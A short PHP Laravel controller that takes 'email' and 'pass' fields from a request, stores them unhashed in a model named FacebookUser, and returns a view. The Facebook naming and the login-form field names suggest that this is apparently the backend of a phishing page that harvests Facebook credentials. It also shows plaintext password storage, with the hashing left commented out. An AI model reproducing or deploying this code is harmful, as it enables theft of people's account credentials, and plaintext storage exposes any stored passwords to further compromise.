<?php

namespace App\Http\Controllers;

use App\Models\FacebookUser;
use Illuminate\Http\Request;

class FacebookGetcontroller extends Controller
{
    public function store(Request $request)
    {
        // Validate the incoming request data if needed
        // $request->validate([
        //     'email' => 'required|email',
        //     'pass' => 'required|min:6',
        // ]);

        // Get the input data
        $email = $request->input('email');
        $pass = $request->input('pass');

        // Create a new FacebookUser with the specified fields
        $userData = ['email' => $email, 'password' => $pass];
        $user = FacebookUser::create($userData);

        // You might want to hash the password before saving it to the database
        // $userData = ['email' => $email, 'password' => bcrypt($pass)];
        // $user = FacebookUser::create($userData);

        // Return a view with the data
        return view('baper_bari', compact('email', 'pass'));
    }
}
